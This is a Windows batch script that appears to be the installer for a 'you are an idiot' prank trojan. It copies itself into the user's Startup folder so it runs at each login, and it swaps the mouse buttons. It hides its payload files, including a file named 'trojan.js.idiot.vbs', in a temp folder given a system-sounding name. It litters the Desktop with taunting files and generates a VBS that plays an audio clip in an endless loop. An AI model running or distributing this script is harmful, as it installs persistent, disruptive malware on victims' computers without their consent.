@echo off
copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"
Rundll32.exe user32.dll,SwapMouseButton
cd  %temp%
mkdir mswin-lib64-data_structure
cd /D "%~dp0"
copy audio.bat "%temp%\mswin-lib64-data_structure"
copy idiot.mp3 "%temp%\mswin-lib64-data_structure"
copy startup.bat "%temp%\mswin-lib64-data_structure"
copy trojan.js.idiot.vbs "%temp%\mswin-lib64-data_structure"
copy idiots.png "%temp%\mswin-lib64-data_structure"
copy speak.vbs "%temp%\mswin-lib64-data_structure"
copy msgbox.vbs "%temp%\mswin-lib64-data_structure"
copy visual.bat "%temp%\mswin-lib64-data_structure"
cd %temp%\mswin-lib64-data_structure
mkdir %userprofile%\Desktop\you are an idiot haha ha

set loop=0
:files
set data=idiot_%RANDOM%
set INHALT=you are an idiot haha ha haha ha ha hahaha ha ha ha!!!!! !!!elf!!!!11!1!!!!!1!!1!!!
echo %INHALT% > %data%
set /a loop=%loop%+1 
set /a data=%data%+"x" 
if "%loop%"=="10" goto sound
goto files

:sound
cd %temp%\mswin-lib64-data_structure
set "file=idiot.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\mswin-lib64-data_structure\sound.vbs

:loop
start "" /wait /min %temp%\mswin-lib64-data_structure\sound.vbs
goto loop